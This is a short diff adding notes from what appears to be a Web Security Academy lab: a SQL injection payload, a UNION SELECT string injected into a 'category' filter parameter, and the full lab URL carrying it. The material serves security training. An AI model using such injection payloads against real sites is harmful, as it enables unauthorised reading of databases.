@@ -1,0 +1,5 @@
+Payload
+Lifestyle'+UNION+SELECT+3,'CdWMC9',+1+--
+
+Final payload :
+0a25004b04d3ca4180f5626a009b0004.web-security-academy.net/filter?category=Lifestyle'+UNION+SELECT+3,'CdWMC9',+1+--
